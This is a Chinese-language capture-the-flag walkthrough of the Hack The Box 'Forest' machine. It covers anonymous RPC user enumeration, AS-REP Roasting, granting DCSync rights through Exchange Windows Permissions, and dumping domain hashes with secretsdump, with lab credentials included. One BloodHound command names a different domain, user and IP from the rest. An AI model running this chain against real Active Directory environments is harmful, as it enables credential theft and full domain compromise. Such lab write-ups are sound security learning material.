---
title: Forest
description: 
tags:
  - AS-REP Roasting
  - DCSync Attack
date: 2026-05-28
---

## 帳號列舉

這邊發現，主機 LDAP 可以匿名連線，把使用者帳號都 dump 出來；另外，雖然 SMB 沒有開放的資料可以存取，不過因為可以匿名連線，所以也可以使用 `rpcclient`，直接透過 RPC 來列舉使用者帳號。

```bash
rpcclient -U "" -N <Target_IP>
## 列舉使用者帳號
rpcclient $>    enumdomusers
## 列舉群組
rpcclient $>    enumdomgroups
## 伺服器資訊
rpcclient $>    srvinfo
```

然後就可以把拿到的帳號先建立好 user list，後續進行 AS-REP Roasting 攻擊。

## AS-REP Roasting

基本上就是對沒有設定 pre-authentication 的帳號進行 AS-REP Roasting 攻擊，來獲取該帳號的 Kerberos 金鑰，進而嘗試破解密碼。

```bash
impacket-GetNPUsers '<Domain>/' -usersfile userlist.txt -format hashcat -dc-ip <Target_IP> -no-pass
```

## DCSync Attack

先看一下權限拓樸

```bash
bloodhound-python -c all -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -ns 10.129.78.3 --zip
```

發現帳號 `svc-alfresco` 可以直接提權到 `EXCHANGE WINDOWS PERMISSIONS`，`EXCHANGE WINDOWS PERMISSIONS` 又有 `HTB.LOCAL` 的編輯權限，於是我們先把 `svc-alfresco` 提權到 `EXCHANGE WINDOWS PERMISSIONS`

```bash
bloodyAD -d htb.local -u 'svc-alfresco' -p 's3rvice' --host 10.129.175.76 add groupMember "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco
```

可以在 powershell 上面用 `net group 'Exchange Windows Permissions'` 確認權限有沒有被加入成功。

接著為了要進行 DCSync Attack，我們需要給予帳號 `svc-alfresco` `DCSync` 的權限，這樣才能夠從 Domain Controller 同步帳號資訊。

```bash
bloodyAD --host 10.129.175.76 -d htb.local -u 'svc-alfresco' -p 's3rvice' add dcsync 'svc-alfresco'
```

另一種做法是直接在 powershell 上面執行 `Add-DomainObjectAcl` 來給予 `svc-alfresco` `DCSync` 的權限。

> 這邊以後其實沒有成功
> 另外，Add-DomainObjectAcl 非 powershell 內建指令，需要先執行 `. .\PowerView.ps1` 才能夠使用。`locate PowerView.ps1` 可以找到這個檔案的位置。

```bash
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('svc-alfresco', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

理論上，如果權限設定正確，就可以直接發動 DCSync Attack 。

```bash
## DCSync secretsdump
## 好處是可以盡量不落地
## 也可以選擇直接去 windows 上執行 mimikatz
impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.175.76
```